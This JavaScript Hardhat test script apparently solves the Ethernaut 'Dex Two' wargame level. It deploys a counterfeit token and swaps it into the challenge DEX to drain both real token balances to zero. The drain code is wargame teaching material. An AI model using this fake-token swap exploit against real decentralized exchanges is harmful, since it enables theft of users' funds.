const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0xDEcc7b8C6d11385f6ed2d0df45EcAc1D654F9DA4"

describe("23 Dex Two", function () {
    let player, challengeContract, solutionContract, token1, token2

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "DexTwo",
            CONTRACT_ADDRESS,
            player
        )
        token1 = await challengeContract.token1()
        token2 = await challengeContract.token2()
        solutionContract = await (
            await ethers.getContractFactory("DexTwoSolution", player)
        ).deploy(400)
        const token1BalanceBefore = await challengeContract.balanceOf(
            token1,
            challengeContract.address
        )
        const token2BalanceBefore = await challengeContract.balanceOf(
            token2,
            challengeContract.address
        )
        assert(
            token1BalanceBefore.toString() != "0" &&
                token2BalanceBefore.toString() != "0"
        )
    })

    it("Execution", async function () {
        let txResponse = await solutionContract.transfer(
            challengeContract.address,
            100
        )
        await txResponse.wait(1)
        txResponse = await solutionContract.approve(
            challengeContract.address,
            300
        )
        await txResponse.wait(1)
        txResponse = await challengeContract.swap(
            solutionContract.address,
            token1,
            100
        )
        await txResponse.wait(1)
        txResponse = await challengeContract.swap(
            solutionContract.address,
            token2,
            200
        )
        await txResponse.wait(1)
    }).timeout(1_000_000)

    after(async function () {
        const token1BalanceAfter = await challengeContract.balanceOf(
            token1,
            challengeContract.address
        )
        const token2BalanceAfter = await challengeContract.balanceOf(
            token2,
            challengeContract.address
        )
        assert(
            token1BalanceAfter.toString() == "0" &&
                token2BalanceAfter.toString() == "0"
        )
    })
})
